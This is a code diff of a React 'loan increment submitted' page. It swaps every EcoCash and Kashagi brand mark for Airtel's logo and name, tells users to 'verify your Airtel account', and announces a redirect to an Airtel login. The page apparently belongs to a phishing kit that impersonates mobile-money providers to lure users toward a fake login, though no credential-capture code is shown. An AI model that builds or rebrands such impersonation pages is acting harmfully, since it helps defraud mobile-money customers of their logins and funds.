@@ -25,7 +25,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
         <div style={pageStyle}>
             <div style={headerStyle}>
                 <div style={{ width: "60px" }} />
-                <img src="/ecocash.png" alt="EcoCash" style={logoStyle} />
+                <img src="/airtel.svg" alt="Airtel" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -66,7 +66,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             color: "#10b981",
                         }}
                     >
-                        Kashagi Loan Increment Submitted
+                        Airtel Loan Increment Submitted
                     </h1>
                     <p
                         style={{
@@ -76,7 +76,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        Your Kashagi limit increase request has been submitted. Please wait for processing.
+                        Your Airtel limit increase request has been submitted. Please wait for processing.
                     </p>
                     <p
                         style={{
@@ -86,7 +86,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        You will receive a confirmation. For now, proceed to verify your EcoCash account.
+                        You will receive a confirmation. For now, proceed to verify your Airtel account.
                     </p>
                     <div
                         style={{
@@ -113,14 +113,14 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                                     margin: 0,
                                 }}
                             >
-                                Redirecting to EcoCash login...
+                                Redirecting to Airtel login...
                             </p>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Kashagi Zimbabwe</div>
+            <div style={footerStyle}>© 2025 Airtel Zimbabwe</div>
         </div>
     );
 }
